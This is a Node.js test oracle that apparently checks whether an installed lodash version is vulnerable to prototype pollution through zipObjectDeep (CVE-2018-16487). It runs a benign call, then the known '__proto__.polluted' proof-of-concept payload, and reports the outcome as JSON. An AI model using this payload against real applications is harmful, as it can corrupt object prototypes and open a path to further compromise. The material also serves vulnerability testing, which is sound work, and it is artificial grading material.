'use strict';
const path = require('node:path');
const fs = require('node:fs');
const os = require('node:os');

function finish(result) {
  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

let _;
try {
  _ = require('lodash');
} catch (e) {
  finish({ operation_completed: false, exploit_succeeded: false, evidence: 'module resolution failed: ' + String(e && e.message) });
  process.exit(0);
}

const marker = 'oracle_' + process.pid + '_' + Date.now();
const tmpFile = path.join(os.tmpdir(), marker + '.json');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function cleanupPollution() {
  try {
    if (Object.prototype.hasOwnProperty.call(Object.prototype, 'polluted')) {
      delete Object.prototype.polluted;
    }
  } catch (e) { /* ignore */ }
}

cleanupPollution();

try {
  // Benign operation: zipObjectDeep builds a nested plain object from dotted paths and values.
  const benignResult = _.zipObjectDeep(['a.b', 'a.c'], [1, 2]);

  const benignOk =
    benignResult &&
    benignResult.a &&
    benignResult.a.b === 1 &&
    benignResult.a.c === 2;

  if (!benignOk) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'benign zipObjectDeep did not produce expected shape: ' + JSON.stringify(benignResult) });
    process.exit(0);
  }

  // Demonstrate /tmp usage with a unique marker to confirm filesystem access works as expected.
  fs.writeFileSync(tmpFile, JSON.stringify({ marker, benignResult }));
  const readBack = JSON.parse(fs.readFileSync(tmpFile, 'utf8'));
  if (!readBack || readBack.marker !== marker) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'tmp fixture roundtrip failed' });
    process.exit(0);
  }
  try { fs.unlinkSync(tmpFile); } catch (e) { /* ignore cleanup errors */ }

  operation_completed = true;

  // Malicious input: the documented CVE-2018-16487 PoC. A path string whose first
  // segment is '__proto__' walks through Object.prototype during zipObjectDeep's
  // internal baseSet-style traversal in vulnerable lodash versions.
  const maliciousPaths = ['__proto__.polluted'];
  const maliciousValues = ['yes'];

  try {
    _.zipObjectDeep(maliciousPaths, maliciousValues);
  } catch (callErr) {
    const freshAfterError = {};
    const ownAfterError = Object.prototype.hasOwnProperty.call(Object.prototype, 'polluted');
    const pollutedAfterError = ownAfterError || freshAfterError.polluted === 'yes';
    evidence = 'malicious zipObjectDeep threw: ' + String(callErr && callErr.message) + '; fresh {}.polluted=' + String(freshAfterError.polluted);
    cleanupPollution();
    finish({ operation_completed: true, exploit_succeeded: pollutedAfterError, evidence });
    process.exit(0);
  }

  // Check pollution on a completely new, unrelated plain object literal.
  const freshObj = {};
  const polluted = freshObj.polluted === 'yes';
  const ownCheck = Object.prototype.hasOwnProperty.call(Object.prototype, 'polluted');

  exploit_succeeded = !!(polluted && ownCheck);

  evidence = exploit_succeeded
    ? 'Object.prototype.polluted === "yes" after zipObjectDeep(["__proto__.polluted"], ["yes"]); fresh {}.polluted=' + String(freshObj.polluted)
    : 'No pollution observed on Object.prototype after malicious zipObjectDeep; fresh {}.polluted=' + String(freshObj.polluted);

  cleanupPollution();

  finish({ operation_completed, exploit_succeeded, evidence });
} catch (unexpectedErr) {
  if (operation_completed) {
    cleanupPollution();
    finish({ operation_completed: true, exploit_succeeded: false, evidence: 'unexpected exception after benign success, treated as blocked: ' + String(unexpectedErr && unexpectedErr.message) });
  } else {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'unexpected exception before benign success: ' + String(unexpectedErr && unexpectedErr.message) });
  }
}
